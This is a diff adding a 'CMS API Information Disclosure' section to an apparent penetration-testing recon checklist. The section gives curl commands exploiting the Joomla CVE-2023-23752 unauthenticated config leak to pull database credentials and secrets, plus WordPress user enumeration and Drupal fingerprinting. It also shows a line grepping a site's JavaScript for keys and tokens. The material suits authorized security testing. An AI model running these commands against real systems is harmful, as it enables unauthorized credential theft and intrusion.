@@ -84,6 +84,38 @@ curl -s https://target.com/static/js/main.js | grep -oiE 'api[_-]?key|token|pass
 
 ---
 
+### 2c. CMS API Information Disclosure
+
+CMS platforms often expose configuration via API endpoints without authentication.
+
+**Joomla (CVE-2023-23752, v4.0.0–4.2.7)**:
+```bash
+# Version fingerprint
+curl -s https://target/administrator/manifests/files/joomla.xml | grep version
+
+# Unauthenticated config leak — DB creds, mail config, secrets
+curl -s "https://target/api/index.php/v1/config/application?public=true" | python3 -m json.tool
+# Paginate: &page[offset]=20&page[limit]=20 (up to 4 pages)
+# Look for: user, password, db, dbprefix, secret, mailfrom
+```
+
+**WordPress**:
+```bash
+# User enumeration via REST API (WP 4.7+)
+curl -s https://target/wp-json/wp/v2/users | jq '.[].slug'
+# Version: /wp-includes/version.php, /feed/, meta generator tag
+```
+
+**Drupal**:
+```bash
+# Version via CHANGELOG.txt or /core/install.php
+curl -s https://target/CHANGELOG.txt | head -5
+```
+
+**General CMS pattern**: When main domain serves a static site, check vhosts (`dev.`, `staging.`, `test.`, `cms.`) — the CMS often runs on a subdomain.
+
+---
+
 ### 3. Backup Files
 ```
 □ Check robots.txt for disallowed paths
